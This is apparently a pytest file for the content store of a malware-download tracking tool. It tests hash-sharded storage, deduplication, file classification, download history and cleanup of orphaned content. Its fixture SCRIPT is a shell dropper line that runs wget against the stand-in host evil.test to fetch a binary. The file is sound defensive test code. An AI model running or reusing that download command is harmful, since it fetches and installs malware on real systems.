import hashlib
import json
import os

import pytest
import requests

from common import content_store
from tests.factories import insert_content, insert_download, insert_sandbox_submission, insert_url

SCRIPT = b"#!/bin/sh\nwget http://evil.test/x86\n"


def test_write_content_file_is_sharded_and_deduplicated(content_dir):
    sha256 = hashlib.sha256(SCRIPT).hexdigest()

    path = content_store.write_content_file(content_dir, sha256, SCRIPT)

    assert path == os.path.join(content_dir, sha256[:2], sha256[2:4], sha256)
    assert open(path, "rb").read() == SCRIPT
    mtime = os.path.getmtime(path)
    assert content_store.write_content_file(content_dir, sha256, SCRIPT) == path
    assert os.path.getmtime(path) == mtime  # existing file is not rewritten


def test_get_or_create_content_deduplicates_and_classifies(db, content_dir):
    first = content_store.get_or_create_content(db, content_dir, SCRIPT, mime_type="application/x-sh")
    second = content_store.get_or_create_content(db, content_dir, SCRIPT)

    assert first["created"] is True and second["created"] is False
    assert first["id"] == second["id"]
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 1
    # FakeMagika classified the new payload
    assert db.execute("SELECT file_category, magika_label FROM content").fetchone() == ("script", "shell")


def test_record_download_observation_change_types(db):
    url = insert_url(db)
    old, new = insert_content(db, b"v1"), insert_content(db, b"v2")

    for content_id, fetched_at in [(old, "2026-01-01T00:00:00"), (old, "2026-01-02T00:00:00"),
                                   (new, "2026-01-03T00:00:00"), (None, "2026-01-04T00:00:00")]:
        content_store.record_download_observation(db, url, content_id=content_id, fetched_at=fetched_at)

    rows = db.execute("SELECT change_type FROM download_observations ORDER BY fetched_at").fetchall()
    assert [r[0] for r in rows] == ["initial", "confirmed", "content_changed", "unavailable"]


def test_content_versions_group_failed_fetches_by_reason(db):
    url = insert_url(db)
    stored = insert_content(db, b"v1")
    insert_download(db, url, stored, fetched_at="2026-01-01T00:00:00")
    insert_download(db, url, fetched_at="2026-01-02T00:00:00", fetch_error="timeout")
    insert_download(db, url, fetched_at="2026-01-03T00:00:00", fetch_error="timeout")
    insert_download(db, url, fetched_at="2026-01-04T00:00:00", status_code=404, fetch_error="http_error")
    insert_download(db, url, fetched_at="2026-01-05T00:00:00", status_code=None)  # recorded before migration 009

    versions = content_store.get_content_versions(db, url)

    assert [(v["content_id"], v["fetch_count"], v["failure"]) for v in versions] == [
        (stored, 1, None),
        (None, 2, "Connection timed out"),
        (None, 1, "Server returned HTTP 404"),
        (None, 1, "No HTTP response (connection failed or timed out)"),
    ]


def test_fetch_error_is_not_stored_with_content(db):
    url = insert_url(db)
    content_id = insert_content(db, b"v1")

    content_store.record_download_observation(db, url, content_id=content_id, fetch_error="timeout")

    assert db.execute("SELECT fetch_error FROM download_observations").fetchone() == (None,)


def test_cleanup_orphan_content_keeps_shared_payloads(db, content_dir):
    a, b = insert_url(db, "http://a.test/x"), insert_url(db, "http://b.test/x")
    shared = insert_content(db, b"shared", content_dir=content_dir)
    orphan = insert_content(db, b"orphan", content_dir=content_dir)
    insert_download(db, a, shared)
    insert_download(db, b, shared)
    insert_download(db, a, orphan)
    orphan_path = db.execute("SELECT file_path FROM content WHERE id = ?", (orphan,)).fetchone()[0]

    candidates = {cid for cid, _ in content_store.content_ids_for_urls(db, [a])}
    content_store.delete_urls(db, [a])
    summary = content_store.cleanup_orphan_content(db, candidates=candidates)

    assert summary == {"removed": 1, "skipped_shared": 1, "file_errors": 0}
    assert [r[0] for r in db.execute("SELECT id FROM content").fetchall()] == [shared]
    assert not os.path.exists(orphan_path)


def test_resolve_source_ip_uses_fake_dns(fake_dns):
    assert content_store.resolve_source_ip("http://evil.test/a.sh") == "192.0.2.1"
    assert fake_dns == ["evil.test"]


def test_get_or_create_content_returns_none_when_disk_write_fails(db, tmp_path):
    not_a_dir = tmp_path / "file"
    not_a_dir.write_text("x")

    assert content_store.get_or_create_content(db, str(not_a_dir), SCRIPT) is None
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 0


def test_known_but_unclassified_content_is_classified_on_next_download(db, content_dir, fake_magika):
    content_id = insert_content(db, SCRIPT, content_dir=content_dir)  # e.g. stored before migration 008

    info = content_store.get_or_create_content(db, content_dir, SCRIPT)

    assert (info["id"], info["created"]) == (content_id, False)
    assert db.execute("SELECT file_category FROM content").fetchone() == ("script",)
    content_store.get_or_create_content(db, content_dir, SCRIPT)
    assert len(fake_magika.calls) == 1  # classified only once


def test_classify_content_reads_the_stored_file(db, content_dir):
    content_id = insert_content(db, b"\x7fELF\x02\x01\x01" + b"\x00" * 64, content_dir=content_dir)
    file_path = db.execute("SELECT file_path FROM content").fetchone()[0]

    assert content_store.classify_content(db, content_id, file_path=file_path)["category"] == "executable"
    assert content_store.classify_content(db, content_id, file_path="/nonexistent/file") is None


def test_remove_content_file(content_dir, tmp_path):
    path = tmp_path / "sample"
    path.write_bytes(b"x")

    assert content_store.remove_content_file(str(path)) is True and not path.exists()
    assert content_store.remove_content_file(str(path)) is True  # already missing
    assert content_store.remove_content_file(None) is False


def test_cleanup_orphan_content_detaches_sandbox_submissions(db, content_dir):
    orphan = insert_content(db, b"orphan", content_dir=content_dir)
    sha256 = db.execute("SELECT sha256 FROM content").fetchone()[0]
    insert_sandbox_submission(db, orphan, sha256, status="done")

    summary = content_store.cleanup_orphan_content(db)  # no candidates -> every content row is checked

    assert summary == {"removed": 1, "skipped_shared": 0, "file_errors": 0}
    assert db.execute("SELECT content_id, sha256 FROM sandbox_submissions").fetchone() == (None, sha256)


def test_cleanup_orphan_content_counts_file_errors(db, content_dir, monkeypatch):
    insert_content(db, b"orphan", content_dir=content_dir)
    monkeypatch.setattr(content_store.os, "remove", lambda path: (_ for _ in ()).throw(PermissionError(path)))

    summary = content_store.cleanup_orphan_content(db)

    assert summary == {"removed": 1, "skipped_shared": 0, "file_errors": 1}
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 0


def test_cleanup_orphan_content_with_empty_candidates_does_nothing(db, content_dir):
    insert_content(db, b"orphan", content_dir=content_dir)

    assert content_store.cleanup_orphan_content(db, candidates=[None]) == {
        "removed": 0, "skipped_shared": 0, "file_errors": 0}
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 1


@pytest.mark.parametrize("error, key", [
    (requests.exceptions.ConnectTimeout(), "timeout"),
    (requests.exceptions.ReadTimeout(), "timeout"),
    (requests.exceptions.TooManyRedirects(), "too_many_redirects"),
    (requests.exceptions.ConnectionError(), "connection_error"),
    (requests.exceptions.InvalidURL(), "request_error"),
])
def test_fetch_error_from_exception(error, key):
    assert content_store.fetch_error_from_exception(error) == key


@pytest.mark.parametrize("fetch_error, status_code, text", [
    ("http_error", 503, "Server returned HTTP 503"),
    ("oversized", 200, content_store.FETCH_ERRORS["oversized"]),
    ("storage_failed", 200, content_store.FETCH_ERRORS["storage_failed"]),
    (None, None, "No HTTP response (connection failed or timed out)"),  # rows recorded before migration 009
    (None, 500, "Server returned HTTP 500"),
    (None, 200, "Response received but no content stored (empty, too large or storage failure)"),
])
def test_describe_fetch_failure(fetch_error, status_code, text):
    assert content_store.describe_fetch_failure(fetch_error, status_code) == text


def test_content_versions_group_consecutive_identical_content(db, content_dir):
    url = insert_url(db)
    v1 = insert_content(db, SCRIPT, content_dir=content_dir, file_category="script", magika_label="shell")
    v2 = insert_content(db, b"v2")
    for content_id, day, change in [(v1, 1, "initial"), (v1, 2, "confirmed"), (v2, 3, "content_changed"),
                                    (v1, 4, "content_changed")]:
        insert_download(db, url, content_id, fetched_at=f"2026-01-0{day}T00:00:00", change_type=change,
                        source_ip=f"192.0.2.{day}", response_headers=json.dumps({"Server": f"s{day}"}))

    versions = content_store.get_content_versions(db, url)

    assert [(v["version"], v["content_id"], v["fetch_count"], v["changed"]) for v in versions] == [
        (1, v1, 2, False), (2, v2, 1, True), (3, v1, 1, True)]
    first = versions[0]
    assert (first["first_fetched"], first["last_fetched"]) == ("2026-01-01T00:00:00", "2026-01-02T00:00:00")
    # the freshest metadata of the group is kept
    assert (first["source_ip"], first["response_headers"]) == ("192.0.2.2", {"Server": "s2"})
    assert first["content_type"]["category_label"] == "Script" and first["content_type"]["severity"] == "high"
    assert versions[1]["content_type"] is None  # not classified


def test_resolve_source_ip_of_url_without_host():
    assert content_store.resolve_source_ip("not a url") is None


def test_failed_write_leaves_no_partial_file(db, content_dir, monkeypatch):
    def disk_full(path, mode):
        with open(path, mode) as fh:  # the builtin: a partial temp file is written first
            fh.write(b"part")
        raise OSError(28, "No space left on device")
    monkeypatch.setattr(content_store, "open", disk_full, raising=False)

    assert content_store.get_or_create_content(db, content_dir, SCRIPT) is None
    assert [files for _, _, files in os.walk(content_dir) if files] == []
    assert db.execute("SELECT COUNT(*) FROM content").fetchone()[0] == 0


def test_failed_rename_leaves_no_temp_file(db, content_dir, monkeypatch):
    def broken(src, dst):
        raise OSError("rename failed")
    monkeypatch.setattr(content_store.os, "replace", broken)

    assert content_store.get_or_create_content(db, content_dir, SCRIPT) is None
    assert [files for _, _, files in os.walk(content_dir) if files] == []
